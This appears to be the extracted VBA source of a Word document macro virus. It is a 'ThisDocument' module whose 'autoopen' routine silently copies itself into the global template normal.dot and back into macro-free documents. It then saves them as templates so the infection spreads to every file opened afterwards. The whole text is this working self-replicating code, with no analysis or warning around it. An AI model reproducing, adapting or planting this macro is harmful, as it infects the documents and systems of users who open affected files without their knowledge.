   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "autoopen"

   Public Sub MAIN()
   Dim a$
   Dim b$
   Dim c$
   a$ = "autoopen"
   b$ = WordBasic.[FileName$]()
   c$ = WordBasic.[DefaultDir$](2) + "\normal.dot"
   Dim a_ As Object: Set a_ = WordBasic.DialogRecord.Organizer(False)
   Set a_ = WordBasic.CurValues.Organizer
   a_.Copy = 1
   a_.Tab = 3
   a_.Name = a$
   a_.Source = b$
   a_.Destination = c$
   On Error Resume Next
   WordBasic.Organizer a_
   If WordBasic.CountMacros(1) = 0 Then
   a_.Source = c$
   a_.Destination = b$
   WordBasic.Organizer a_
   WordBasic.FileSaveAs Format:=1
   End If
   End Sub
